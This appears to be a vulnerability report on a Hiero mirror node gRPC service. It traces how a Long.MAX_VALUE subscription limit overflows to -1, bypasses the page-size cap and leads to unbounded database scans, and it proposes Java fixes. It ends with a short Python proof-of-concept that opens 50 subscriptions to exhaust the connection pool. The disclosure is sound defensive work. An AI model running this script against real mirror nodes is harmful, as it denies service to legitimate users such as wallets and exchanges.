### Title
Integer Overflow in `PollingTopicMessageRetriever.poll()` Triggered by Attacker-Controlled `Long.MAX_VALUE` Limit Bypasses Page-Size Cap, Enabling Unbounded DB Queries

### Summary
An unprivileged gRPC caller can set `limit = Long.MAX_VALUE` (or any value ≥ 2^31) in `ConsensusTopicQuery`. `ConsensusController.toFilter()` passes this value directly to `TopicMessageFilter` with no upper-bound check. Inside `PollingTopicMessageRetriever.poll()`, a narrowing cast `(int)(Long.MAX_VALUE - total)` overflows to `-1`, which then defeats the `Math.min(limit, maxPageSize)` page-size guard and causes the repository to execute queries with no effective `LIMIT`, enabling a single unauthenticated client to hold DB connections open with full-table scans and starve legitimate subscribers.

### Finding Description

**Step 1 – No upper-bound validation in `toFilter()`** [1](#0-0) 

`query.getLimit()` is a raw `long` from the protobuf wire; it is assigned directly to the filter builder. There is no `@Max`, no clamping, and no rejection of values above a safe threshold.

**Step 2 – `TopicMessageFilter` only enforces `@Min(0)`** [2](#0-1) 

`Long.MAX_VALUE` satisfies `@Min(0)` and passes Spring validation without error.

**Step 3 – Integer overflow in `poll()` destroys the page-size cap** [3](#0-2) 

When `filter.getLimit() = Long.MAX_VALUE` and `total = 0`:

```
(int)(Long.MAX_VALUE - 0)  →  (int)0x7FFFFFFFFFFFFFFF  →  -1
Math.min(-1, maxPageSize)  →  -1
```

`pageSize` is `-1`. The `newFilter` is built with `limit(-1)`. Since `hasLimit()` returns `limit > 0`, a limit of `-1` makes `hasLimit()` return **false**.

**Step 4 – Repository receives a filter with no effective limit**

When `newFilter.hasLimit() == false` the repository falls back to no `LIMIT` clause (or `Integer.MAX_VALUE`), issuing a full-table scan over all topic messages from `startTime` onward.

**Step 5 – `isComplete()` never fires on the limit branch** [4](#0-3) 

`filter.getLimit() == total.get()` evaluates to `Long.MAX_VALUE == <small number>` which is always `false`, so the limit-hit termination path is permanently disabled for this subscription.

### Impact Explanation
Each malicious subscription triggers at least one unbounded `SELECT` against the `topic_message` table, holding a DB connection for the full duration of the scan. A topic with millions of messages (common on mainnet) means each such query can run for seconds to minutes. With a small number of concurrent malicious subscriptions the connection pool is exhausted, causing all legitimate `subscribeTopic` calls — including those used by wallets and exchanges to confirm fund-critical HCS messages — to queue or fail with connection-timeout errors. This is a practical, unauthenticated denial-of-service against the mirror node's gRPC tier.

### Likelihood Explanation
The gRPC `subscribeTopic` endpoint is publicly reachable with no authentication. Setting `limit` to `Long.MAX_VALUE` (protobuf `uint64` field 7) requires only a standard gRPC client and one line of code. The attack is trivially repeatable and scriptable; a single attacker with a modest number of parallel connections can sustain the DoS indefinitely.

### Recommendation
1. **Cap the limit in `toFilter()`** before it reaches the filter:
   ```java
   long rawLimit = query.getLimit();
   long safeLimit = (rawLimit == 0) ? 0 : Math.min(rawLimit, grpcProperties.getMaxSubscriptionLimit());
   final var filter = TopicMessageFilter.builder().limit(safeLimit);
   ```
2. **Add `@Max` to `TopicMessageFilter.limit`** (e.g., `@Max(Integer.MAX_VALUE)`) so Spring validation rejects oversized values before they reach the retriever.
3. **Fix the narrowing cast in `poll()`**: use `long` arithmetic throughout and only convert to `int` after clamping to `[0, maxPageSize]`:
   ```java
   long remaining = filter.hasLimit() ? filter.getLimit() - context.getTotal().get() : Integer.MAX_VALUE;
   int pageSize = (int) Math.min(Math.max(remaining, 0), context.getMaxPageSize());
   ```

### Proof of Concept
```python
import grpc
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as cs
from com.hedera.mirror.api.proto import consensus_service_pb2 as cp
from com.hederahashgraph.api.proto.java import basic_types_pb2 as bt

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = cs.ConsensusServiceStub(channel)

# Set limit to Long.MAX_VALUE (2^63 - 1)
query = cp.ConsensusTopicQuery(
    topicID=bt.TopicID(topicNum=1),
    limit=9223372036854775807,   # Long.MAX_VALUE
)

# Open many concurrent subscriptions
for _ in range(50):
    stub.subscribeTopic(query)   # each triggers an unbounded DB scan

# Legitimate subscribers now fail to obtain DB connections
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L55-57)
```java
    private TopicMessageFilter toFilter(ConsensusTopicQuery query) {
        final var filter = TopicMessageFilter.builder().limit(query.getLimit());

```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L25-26)
```java
    @Min(0)
    private long limit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L68-75)
```java
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L121-128)
```java
        boolean isComplete() {
            boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();

            if (throttled) {
                return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
            }

            return limitHit;
```
